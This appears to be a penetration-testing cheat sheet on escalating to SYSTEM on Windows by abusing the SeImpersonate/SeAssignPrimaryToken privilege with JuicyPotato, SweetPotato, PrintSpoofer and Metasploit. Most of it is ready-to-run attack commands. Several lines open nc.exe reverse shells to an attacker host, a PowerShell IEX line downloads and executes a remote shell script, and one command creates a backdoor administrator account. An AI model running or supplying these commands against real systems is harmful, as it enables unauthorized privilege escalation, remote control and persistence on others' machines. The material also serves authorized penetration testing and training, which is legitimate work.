# SeImpersonate/SeAssignPrimaryToken

## Theory

This policy setting determines which programs can impersonate a user or other specified account and act on behalf of the user. It is generally assigned to the following groups: **Administrators**, **Local Service**, **Network Service**, **Service**.

{% hint style="success" %}
We will often encounter this privilege after gaining remote code execution through an application running in the context of a service account (e.g., loading a web shell to an [ASP.NET](https://dotnet.microsoft.com/en-us/apps/aspnet) web application, achieving remote code execution through a Jenkins installation, or executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check this privilege, as its presence often provides a quick and easy route to gain elevated privileges.
{% endhint %}

Any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM.

## Practice

{% hint style="warning" %}
**JuicyPotato** does not work on **Windows Server 2019** and **Windows 10 build 1809** onwards. However, **PrintSpoofer** and **RoguePotato** can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) delves into the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.
{% endhint %}

{% tabs %}
{% tab title="JuicyPotato.exe" %}
JuicyPotato can be used to exploit **SeImpersonateToken** or **SeAssignPrimaryToken** privileges through DCOM/NTLM reflection abuse.

{% hint style="danger" %}
Required binaries: **JuicyPotato.exe** and **nc.exe**
{% endhint %}

### Download binary

{% hint style="info" %}
JuicyPotato: [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)
{% endhint %}

```bash
# x64 architecture:
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
# x86 architecture:
wget https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
```

### Method #1 - Execution on disk

1. We transfer the `JuicyPotato.exe` and `nc.exe` binaries (with their correct architectures) to the compromised machine, in a directory where we have permissions.
2. Listen on a port: `rlwrap nc -nvlp <LPORT>`.
3. We execute the binaries:

```shell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd <LHOST> <LPORT>" -t *
```

Done. If we have problems, we can use a CLSID, which allows us to execute a command at NT AUTHORITY\SYSTEM level. Links to see some depending on the operating system:

* [https://github.com/ohpe/juicy-potato/tree/master/CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
* [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

```shell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd <LHOST> <LPORT>" -t * -c "<CLSID>"
```

{% hint style="danger" %}
Remember that it may not work the first time. Try to run it several times.
{% endhint %}

### Method #2 - Off-disk execution (via SMB)

1. We have to have the 2 binaries (nc.exe and JuicyPotato.exe) in the same directory to share a shared resource by SMB:

```bash
smbserver.py smbFolder $(pwd)
```

&#x20; 2\. Listen on a port: `rlwrap nc -nvlp <LPORT>`.

&#x20; 3\. Run the following command on the compromised machine:

```bash
# Without CLSID:
\\<LHOST>\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c \\<LHOST>\smbFolder\nc.exe -e cmd <LHOST> <LPORT>" -t *
# With CLSID:
\\<LHOST>\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c \\<LHOST>\smbFolder\nc.exe -e cmd <LHOST> <LPORT>" -t * -c "<CLSID>"
```

### Method #3 - Execution on disk with PowerShell

1. For this method, we will need the **Invoke-PowerShellTcp.ps1** script from [nishang](https://github.com/samratashok/nishang/tree/master/Shells):

```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

&#x20; 2\. Transfer the **JuicyPotato.exe** binary (with its correct architecture) to the compromised machine, in a directory where we have permissions.&#x20;

&#x20; 3\. We create a `rev.bat` file on the compromised machine containing the following:

```powershell
powershell IEX(New-Object Net.WebClient).downloadString('http://<IP>:<PORT>/Invoke-PowerShellTcp.ps1')
```

```shell
# Create with "echo":
echo powershell IEX(New-Object Net.WebClient).downloadString("http://<IP>:<PORT>/Invoke-PowerShellTcp.ps1") > rev.bat
```

&#x20; 4\. We listen in on a port: `rlwrap nc -nvlp <PORT>`

&#x20; 5\. We open a server to download our file **Invoke-PowerShellTcp.ps1**: [Web Servers](../../../file-transfer/web-servers.md)

&#x20; 6\. Finally, we run the binary:

```bash
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\rev.bat -t * -c "<CLSID>"
```

### Other methods

```shell
# Create and add a user in the Administrators group:
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user leviswings leviswings123! /add & net localgroup Administrators leviswings /add" -t *
```
{% endtab %}

{% tab title="SweetPotato.exe" %}
SweetPotato - the successor to RottenPotatto and JuicyPotatto:

```shell
# 1. Download:
wget https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe
# 2. Transfer the binary to the compromised machine.
# 3. Execute:
SweetPotato.exe -p <BINARY> -a "<ARGUMENTS>" # General syntax
SweetPotato.exe -p cmd.exe -a "/c whoami"
# With nc.exe binary:
SweetPotato.exe -p nc64.exe -a "-e cmd <LHOST> <LPORT>" # Reverse shell
```

{% embed url="https://github.com/uknowsec/SweetPotato" %}
{% endtab %}

{% tab title="PrintSpoofer.exe" %}
### Download/Compilation

To compile it, we can download the ZIP from its repository:

{% embed url="https://github.com/itm4n/PrintSpoofer" %}

To download it, we can use the repository of the user "dievus", who has the compiled binary:

```bash
git clone https://github.com/dievus/printspoofer
```

### Method

1. Transfer the binary to the compromised machine.
2. Execute:

{% hint style="success" %}
The commands will be executed as **NT AUTHORITY\SYSTEM**
{% endhint %}

```shell
# If we have an RDP session:
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c powershell.exe
# If we have a console:
PrintSpoofer.exe -c "<COMMAND>"
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe -e cmd <LHOST> <LPORT>" # With nc binary
```

### References

{% embed url="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges" %}
{% endtab %}

{% tab title="Metasploit" %}
### Requeriments

* Have a meterpreter session.

### Method

```shell
# We can use any of the following two modules:
use exploit/windows/local/ms16_075_reflection
use exploit/windows/local/ms16_075_reflection_juicy
# We set the SESSION, LHOST, LPORT and the PAYLOAD itself with
# the same machine architecture.
run # If we get the meterpreter shell we can continue with the attack.
load incognito
list_tokens -u
# If we see that "NT AUTHORITY\SYSTEM" or an Administrator user
# is available in the "Impersonation Tokens Available" tab, we are
# one step closer to winning. tab, we are one step away from winning.
impersonate token "<USERNAME>"
```

Done :)
{% endtab %}
{% endtabs %}
